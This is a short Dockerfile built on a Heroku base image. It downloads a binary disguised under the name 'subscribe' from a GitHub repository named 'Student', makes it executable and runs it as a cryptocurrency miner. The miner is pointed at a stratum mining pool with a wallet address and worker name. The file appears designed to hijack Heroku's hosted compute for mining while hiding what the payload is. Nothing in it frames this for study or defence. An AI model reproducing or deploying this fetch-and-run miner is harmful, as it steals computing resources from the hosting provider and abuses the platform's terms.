FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/thiraposo/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MhcfqRFwQTXtfwiBKEGpYr3UMoavhFxhYq.brunosmf
CMD bash heroku.sh
